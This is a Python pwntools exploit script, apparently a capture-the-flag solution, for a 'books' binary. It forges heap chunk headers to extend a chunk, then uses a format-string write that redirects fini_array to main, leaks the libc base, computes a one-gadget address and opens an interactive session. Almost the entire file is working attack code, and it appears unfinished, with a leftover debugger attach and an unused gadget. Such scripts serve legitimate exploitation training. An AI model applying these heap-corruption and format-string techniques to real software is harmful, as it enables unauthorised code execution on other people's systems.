from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./books"
book = ELF("./books")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./books")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def edit(order, name):
    p.recvuntil('5: Submit\n')
    p.sendline(str(order))
    p.recvuntil(' order:\n')
    p.sendline(name)


def delete(order):
    p.recvuntil('5: Submit\n')
    p.sendline(str(order + 2))


def submit(payload):
    p.recvuntil('5: Submit\n')
    p.sendline('5' + payload)
    p.recvuntil('Order 1: ')
    p.recvuntil('Order 2: Order 1: ')


def fmt(fmtstr, argv):
    log.info('step 1. chunk extend.')
    payload = fmtstr  # fmtstr
    payload = payload.ljust(0x80, 'f')
    payload += p64(0)  # order 2's prev_size
    payload += p64(0x151)  # order 2's size --> fake large
    payload += '\x00' * 0x140  # padding for fake chunk
    payload += p64(0x150)  # fake chunk's next chunk's prev_size
    payload += p64(
        0x21
    )  # fake chunk's next chunk's size, bypass the check: !prev_inuse(nextchunk)
    payload += '\x00' * 0x10  # padding for fake chunk's next chunk
    payload += p64(0x20) + p64(
        0x21)  # bypass the check: in order not to consolidate
    edit(1, payload)  # modify order 2's chunk size to 0x140
    gdb.attach(p)
    delete(2)  # now, unsorted bin\'s head chunk size 0x140.

    log.info('step 2. format vulnerability')
    # when submit, the overall order content is :
    # Order 1: order1
    # Order 2: Order1: order1
    # try to construct format parameter too
    payload = 'FFFFFFF' + argv
    submit(payload)
    p.recvuntil('2: Order 1: ')


def exp():
    log.info('leak libc base')
    fini_array0 = 0x6011B8  # old: 0x400830
    main_addr = 0x400A39
    # make fini_array0 point to main
    # 13 for " 2: Order 1: "
    # 14 for "%31$p"
    padding = 0x0a39 - 13 - 14
    print hex(padding)
    fmtstr = "%31$p" + "%{}x".format(padding) + "%13$hn"
    fmt(fmtstr, p64(0x6011B8))
    libc_start_main_addr = int(p.recv(14), 16) - 240
    libc_base = libc_start_main_addr - libc.symbols['__libc_start_main']
    log.success('libc base: ' + hex(libc_base))
    one_gadget_addr = libc_base + 0x45216
    log.success('one gadget addr: ' + hex(one_gadget_addr))

    p.interactive()


if __name__ == "__main__":
    exp()
